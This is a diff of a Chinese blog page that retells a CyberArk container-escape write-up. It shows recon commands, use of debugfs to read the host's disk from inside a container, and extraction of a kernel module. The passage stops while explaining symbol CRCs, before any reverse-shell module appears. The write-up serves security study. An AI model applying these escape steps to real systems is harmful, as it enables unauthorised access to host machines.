@@ -1,134 +1,55 @@
 <!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh-CN">
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-
-  
-  
-  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css"/>
-
-
-
-
+<link rel="stylesheet" href="/css/main.css">
 
 
 
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
 
-
-  <meta name="google-site-verification" content="JaodW7D6jSkocuG_zIdKbBnDjM2skzLPZwv5CJMuXiM"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
-
-<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="mask-icon" href="/avatar/avatar.jpeg?v=7.0.1" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '7.0.1',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sunichi.github.io","root":"/","scheme":"Muse","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
 
   <meta name="description" content="CYBERARK一篇关于实际的Docker逃逸文章。">
-<meta name="keywords" content="linux,kernel,docker,escape,2020">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【CYBERARK】容器逃逸实践">
 <meta property="og:url" content="https://sunichi.github.io/2020/02/16/cyberark-docker-escape/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
 <meta property="og:description" content="CYBERARK一篇关于实际的Docker逃逸文章。">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-02-16T12:59:25.845Z">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-02-16T12:50:00.000Z">
+<meta property="article:modified_time" content="2020-02-16T12:59:25.845Z">
+<meta property="article:author" content="sunichi">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="docker">
+<meta property="article:tag" content="escape">
+<meta property="article:tag" content="2020">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="【CYBERARK】容器逃逸实践">
-<meta name="twitter:description" content="CYBERARK一篇关于实际的Docker逃逸文章。">
 
 
+<link rel="canonical" href="https://sunichi.github.io/2020/02/16/cyberark-docker-escape/">
 
 
-
-
-  <link rel="canonical" href="https://sunichi.github.io/2020/02/16/cyberark-docker-escape/"/>
-
-
-
-<script id="page.configurations">
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
   };
 </script>
 
@@ -140,314 +61,220 @@
 
 
 
-
-
-
-
-
-
   <noscript>
   <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
+  body { margin-top: 2rem; }
+
   .use-motion .menu-item,
-  .sidebar-inner,
+  .use-motion .sidebar,
   .use-motion .post-block,
   .use-motion .pagination,
   .use-motion .comments,
   .use-motion .post-header,
   .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
+  .use-motion .collection-header {
+    visibility: visible;
+  }
 
-  .use-motion .logo,
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
   .use-motion .site-title,
-  .use-motion .site-subtitle {
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
     opacity: initial;
     top: initial;
   }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
   </style>
 </noscript>
 
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
 
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Sunichi's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-      
-        <h1 class="site-subtitle" itemprop="description">sunichi@DUBHE | Linux & Pwn & Fuzz</h1>
-      
-    
-    
-  </div>
-
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Sunichi's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">sunichi@DUBHE | Linux & Pwn & Fuzz</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
   </div>
 </div>
 
 
 
-<nav class="site-nav">
+
+
+
+
+</div>
+        
   
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
 
-    
-    
-    
-      
-    
+  <aside class="sidebar">
 
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>
-
-  </li>
-
-      
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
         </li>
-      
-    </ul>
-  
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
 
-  
-    
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E7%9F%A5%E5%B7%B1%E7%9F%A5%E5%BD%BC"><span class="nav-number">1.</span> <span class="nav-text">0x00 知己知彼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5"><span class="nav-number">2.</span> <span class="nav-text">0x01 第一阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5-%E5%88%9B%E5%BB%BA%E6%8E%A2%E9%92%88%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97"><span class="nav-number">3.</span> <span class="nav-text">0x02 第二阶段 - 创建探针内核模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0CRC"><span class="nav-number">3.1.</span> <span class="nav-text">函数CRC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="nav-number">3.1.1.</span> <span class="nav-text">基础概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%AF%BC%E5%87%BA%E7%AC%A6%E5%8F%B7CRC%E7%94%9F%E6%88%90%E8%A7%84%E5%88%99"><span class="nav-number">3.1.2.</span> <span class="nav-text">内核导出符号CRC生成规则</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-1-Find-the-call-usermodehelper-CRC-Address-on-the-Target-Kernel"><span class="nav-number">3.2.</span> <span class="nav-text">Step 1 - Find the call_usermodehelper CRC Address on the Target Kernel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-2-Prepare-a-Makefile"><span class="nav-number">3.3.</span> <span class="nav-text">Step 2 - Prepare a Makefile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-3-Edit-Fields-to-Match-the-Target-Kernel"><span class="nav-number">3.4.</span> <span class="nav-text">Step 3 - Edit Fields to Match the Target Kernel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-4-Change-init-module-Offset"><span class="nav-number">3.5.</span> <span class="nav-text">Step 4 - Change init_module Offset</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-5-Load-the-%E2%80%98Probing%E2%80%99-Module-to-the-Target-Kernel"><span class="nav-number">3.6.</span> <span class="nav-text">Step 5 - Load the ‘Probing’ Module to the Target Kernel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%AC%AC%E4%B8%89%E9%98%B6%E6%AE%B5-%E5%88%9B%E5%BB%BA%E5%8F%8D%E5%90%91shell%E6%A8%A1%E5%9D%97"><span class="nav-number">4.</span> <span class="nav-text">0x03 第三阶段 - 创建反向shell模块</span></a></li></ol></div>
+      </section>
+      <!--/noindex-->
 
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">sunichi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
 </div>
 
 
 
+      </section>
     </div>
-  
-</nav>
+  </aside>
+  <div class="sidebar-dimmer"></div>
 
 
-
-  
-
-
-
-</div>
     </header>
 
     
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div id="content" class="content">
-            
+    <div class="main-inner post posts-expand">
+      
 
-  <div id="posts" class="posts-expand">
+      
+
     
-
-  
-
   
   
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2020/02/16/cyberark-docker-escape/"/>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2020/02/16/cyberark-docker-escape/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sunichi"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="/avatar/avatar.jpeg"/>
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sunichi">
+      <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sunichi's Blog"/>
+      <meta itemprop="name" content="Sunichi's Blog">
     </span>
 
     
+    
       <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【CYBERARK】容器逃逸实践
+        </h1>
 
-        
-        
-          <h2 class="post-title" itemprop="name headline">【CYBERARK】容器逃逸实践
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
 
-              
-            
-          </h2>
-        
+      <time title="创建时间：2020-02-16 20:50:00 / 修改时间：20:59:25" itemprop="dateCreated datePublished" datetime="2020-02-16T20:50:00+08:00">2020-02-16</time>
+    </span>
 
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-02-16 20:50:00 / 修改时间：20:59:25" itemprop="dateCreated datePublished" datetime="2020-02-16T20:50:00+08:00">2020-02-16</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+  
+</div>
 
         </div>
       </header>
-    
 
     
     
     
     <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         <p>CYBERARK一篇关于实际的Docker逃逸文章。</p>
 <a id="more"></a>
+
 <blockquote>
-<p><a href="https://www.cyberark.com/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host/" target="_blank" rel="noopener">https://www.cyberark.com/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cyberark.com/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host/">https://www.cyberark.com/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host/</a></p>
 </blockquote>
 <h2 id="0x00-知己知彼"><a href="#0x00-知己知彼" class="headerlink" title="0x00 知己知彼"></a>0x00 知己知彼</h2><p>了解系统内核：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[node1] $ uname –a</span><br><span class="line">Linux node1 4.4.0-96-generic <span class="comment">#119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 Linux</span></span><br></pre></td></tr></table></figure>
+
 <p>通过uname指令能够获取宿主内核版本、架构、主机名和编译日期。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[node1] $ cat /proc/cmdline</span><br><span class="line">BOOT_IMAGE=/boot/vmlinuz-4.4.0-96-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300</span><br></pre></td></tr></table></figure>
-<p>通过/proc文件系统能够获取boot image信息、root UUID，UUID与宿主root硬盘相关，下一步是定位该UUID的设备：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[node1] $ findfs UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c</span><br><span class="line">/dev/sda1</span><br></pre></td></tr></table></figure></p>
-<p>可以尝试将其挂载，如果成功将能够接触到宿主文件系统：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[node1] $ mkdir /mnt1</span><br><span class="line">[node1] $ mount /dev/sda1 /mnt1</span><br><span class="line">mount: /mnt1: cannot mount /dev/sda1 <span class="built_in">read</span>-only.</span><br></pre></td></tr></table></figure></p>
+<p>通过/proc文件系统能够获取boot image信息、root UUID，UUID与宿主root硬盘相关，下一步是定位该UUID的设备：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[node1] $ findfs UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c</span><br><span class="line">/dev/sda1</span><br></pre></td></tr></table></figure>
+<p>可以尝试将其挂载，如果成功将能够接触到宿主文件系统：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[node1] $ mkdir /mnt1</span><br><span class="line">[node1] $ mount /dev/sda1 /mnt1</span><br><span class="line">mount: /mnt1: cannot mount /dev/sda1 read-only.</span><br></pre></td></tr></table></figure>
+
 <p>无法挂载，PWD可能通过AppArmor做了限制。<br>以下是我在本机上的实验：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@6b1666dad69a:~<span class="comment"># mkdir mnt</span></span><br><span class="line">root@6b1666dad69a:~<span class="comment"># cat /proc/cmdline</span></span><br><span class="line">BOOT_IMAGE=/boot/kernel console=ttyS0 console=ttyS1 page_poison=1 vsyscall=<span class="built_in">emulate</span> panic=1 root=/dev/sr0 text</span><br><span class="line">root@6b1666dad69a:~<span class="comment"># mount /dev/sr</span></span><br><span class="line">sr0  sr1  sr2</span><br><span class="line">root@6b1666dad69a:~<span class="comment"># mount /dev/sr0 ./mnt</span></span><br><span class="line">mount: /dev/sr0 is write-protected, mounting <span class="built_in">read</span>-only</span><br><span class="line">root@6b1666dad69a:~<span class="comment"># cd mnt/</span></span><br><span class="line">root@6b1666dad69a:~/mnt<span class="comment"># ls</span></span><br><span class="line">EFI  boot        dev  home  lib    mnt  proc  run   sendtohost  sys  usr</span><br><span class="line">bin  containers  etc  init  media  opt  root  sbin  srv         tmp  var</span><br><span class="line">root@6b1666dad69a:~/mnt<span class="comment"># ls /</span></span><br><span class="line">bin   dev  home  lib32  libx32  mnt  proc  root  sbin  sys  usr</span><br><span class="line">boot  etc  lib   lib64  media   opt  pwn   run   srv   tmp  var</span><br><span class="line">root@6b1666dad69a:~/mnt<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@6b1666dad69a:~<span class="comment"># mkdir mnt</span></span><br><span class="line">root@6b1666dad69a:~<span class="comment"># cat /proc/cmdline</span></span><br><span class="line">BOOT_IMAGE=/boot/kernel console=ttyS0 console=ttyS1 page_poison=1 vsyscall=<span class="built_in">emulate</span> panic=1 root=/dev/sr0 text</span><br><span class="line">root@6b1666dad69a:~<span class="comment"># mount /dev/sr</span></span><br><span class="line">sr0  sr1  sr2</span><br><span class="line">root@6b1666dad69a:~<span class="comment"># mount /dev/sr0 ./mnt</span></span><br><span class="line">mount: /dev/sr0 is write-protected, mounting read-only</span><br><span class="line">root@6b1666dad69a:~<span class="comment"># cd mnt/</span></span><br><span class="line">root@6b1666dad69a:~/mnt<span class="comment"># ls</span></span><br><span class="line">EFI  boot        dev  home  lib    mnt  proc  run   sendtohost  sys  usr</span><br><span class="line">bin  containers  etc  init  media  opt  root  sbin  srv         tmp  var</span><br><span class="line">root@6b1666dad69a:~/mnt<span class="comment"># ls /</span></span><br><span class="line">bin   dev  home  lib32  libx32  mnt  proc  root  sbin  sys  usr</span><br><span class="line">boot  etc  lib   lib64  media   opt  pwn   run   srv   tmp  var</span><br><span class="line">root@6b1666dad69a:~/mnt<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
 <p>再进一步推进之前，研究一下debugfs，debugfs是ext2/3/4文件系统的一个交互式调试器，它可以读写指定的ext文件系统：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[node1 $ debugfs /dev/sda1</span><br><span class="line">debugfs 1.44.2 (14-May-2018)</span><br><span class="line">debugfs:</span><br></pre></td></tr></table></figure>
+
 <p>我们已经在sda1上渗透了主机的根文件系统。通过使用标准的Linux命令，如cd和ls，可以更深入地了解主机的文件系统：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">debugfs: ls</span><br><span class="line">2 (12) . 2 (12) .. 11 (20) lost+found 12 (12) bin</span><br><span class="line">181 (12) boot 193 (12) dev 282 (12) etc 2028 (12) home</span><br><span class="line">6847 (20) initrd.img 2030 (12) lib 4214 (16) lib64</span><br><span class="line">4216 (16) media 4217 (12) mnt 4218 (12) opt 4219 (12) proc</span><br><span class="line">4220 (12) root 4223 (12) run 4226 (12) sbin 4451 (12) snap</span><br><span class="line">4452 (12) srv 4453 (12) sys 4454 (12) tmp 4455 (12) usr</span><br><span class="line">55481 (12) var 3695 (16) vmlinuz 3529 (12) .rnd 2684 (36) -</span><br><span class="line">17685 (24) initrd.img.old 24035 (3696) vmlinuz.old</span><br></pre></td></tr></table></figure>
+
 <p>这似乎是主机的根目录结构，每个条目前面的数字是inode，如/etc对应inode 282。<br>有了这些信息，我们可以计划下一步：</p>
 <p>计划A：</p>
 <ul>
@@ -462,10 +289,13 @@
 </ul>
 <h2 id="0x01-第一阶段"><a href="#0x01-第一阶段" class="headerlink" title="0x01 第一阶段"></a>0x01 第一阶段</h2><p>借助debugfs应用程序，我们能够轻松浏览主机的文件系统。很快，我们发现了一个内核模块，该模块满足我们战术最低的要求：使用printk。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">debugfs: <span class="built_in">cd</span> /lib/modules</span><br><span class="line">debugfs: ls</span><br><span class="line">3017 (12) . 2030 (48) .. 262485 (24) 4.4.0-96-generic</span><br><span class="line">524603 (28) 4.4.0-137-generic 2055675 (3984) 4.4.0-138-generic</span><br></pre></td></tr></table></figure>
+
 <p>这是宿主/lib/modules目录结构的列表，该目录包含3个不同的内核版本，我们需要4.4.0-96-generic。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debugfs: <span class="built_in">cd</span> 4.4.0-96-generic/kernel/fs/ceph</span><br><span class="line">debugfs: ls</span><br><span class="line">1024182 (12) . 774089 (36) .. 1024183 (4048) ceph.ko</span><br></pre></td></tr></table></figure>
+
 <p>接下来，提取ceph.ko，该文件是ceph软件存储平台的内核模块，主机上使用printk功能的任何其他模块都可以满足我们的要求。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugfs: dump &lt;1024183&gt; /tmp/ceph.ko</span><br></pre></td></tr></table></figure>
+
 <p>dump命令实际上是通过其inode将文件从要调试的文件系统（根文件系统）提取到容器本地的/ tmp目录中。</p>
 <h2 id="0x02-第二阶段-创建探针内核模块"><a href="#0x02-第二阶段-创建探针内核模块" class="headerlink" title="0x02 第二阶段 - 创建探针内核模块"></a>0x02 第二阶段 - 创建探针内核模块</h2><p>一般而言，使用一个内核源代码编译的模块不会加载在使用另一源代码编译的内核上。 但是，对于相对简单的模块，可以在三种情况下将模块加载到其他内核上：</p>
 <ul>
@@ -475,7 +305,7 @@
 </ul>
 <p>我们最终目标是反向Shell，这可以使用特殊的内核函数call_usermodehelper()来完成，该函数用于从内核准备和启动用户模式应用程序。但是，要加载调用此功能的模块，我们必须具有此功能的目标内核的CRC。为了获得目标内核上的call_usermodehelper()函数的CRC，我们使用一个探测模块来完成该任务。</p>
 <h3 id="函数CRC"><a href="#函数CRC" class="headerlink" title="函数CRC"></a>函数CRC</h3><blockquote>
-<p><a href="https://blog.csdn.net/linyt/article/details/42559639" target="_blank" rel="noopener">https://blog.csdn.net/linyt/article/details/42559639</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/linyt/article/details/42559639">https://blog.csdn.net/linyt/article/details/42559639</a></p>
 </blockquote>
 <h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p>解决的问题：插入模块时，内核如何判断该模块引用的内核接口已发生变化（二进制不兼容），防止模块不经重新编译就插入内核，造成系统崩溃。</p>
 <p>由于内核只需要检查模块调用的接口与当前内核提供的接口，在语法和语义是否完全一致（即二进制兼容），而不需要做接口的兼容，甚至保持ABI接口不变。</p>
@@ -503,41 +333,44 @@
 <table>
 <thead>
 <tr>
-<th style="text-align:center">类型</th>
-<th style="text-align:center">CRC值</th>
+<th align="center">类型</th>
+<th align="center">CRC值</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td style="text-align:center">int</td>
-<td style="text-align:center">H(“int”, 0xffffffff) ^ 0xffffffff</td>
+<tbody><tr>
+<td align="center">int</td>
+<td align="center">H(“int”, 0xffffffff) ^ 0xffffffff</td>
 </tr>
 <tr>
-<td style="text-align:center">char</td>
-<td style="text-align:center">H(“char”, 0xffffffff) ^ 0xffffffff</td>
+<td align="center">char</td>
+<td align="center">H(“char”, 0xffffffff) ^ 0xffffffff</td>
 </tr>
 <tr>
-<td style="text-align:center">long</td>
-<td style="text-align:center">H(“long”, 0xffffffff) ^ 0xfffffff</td>
+<td align="center">long</td>
+<td align="center">H(“long”, 0xffffffff) ^ 0xfffffff</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>那么再复杂一点的unsigned int, unsigned long该如何计算，很简单，使用复合+偏序的计算结构，unsinged int的计算方法：</p>
-<p>1) H(“unsigned”, 0xffffffff ) -&gt; crc1</p>
-<p>2) H(空白, crc1) -&gt; crc2</p>
-<p>3) H(“int”, crc2) - &gt;crc3</p>
-<p>4) crc3 ^ 0xfffffff -&gt; 结果</p>
+<ol>
+<li><p>H(“unsigned”, 0xffffffff ) -&gt; crc1</p>
+</li>
+<li><p>H(空白, crc1) -&gt; crc2</p>
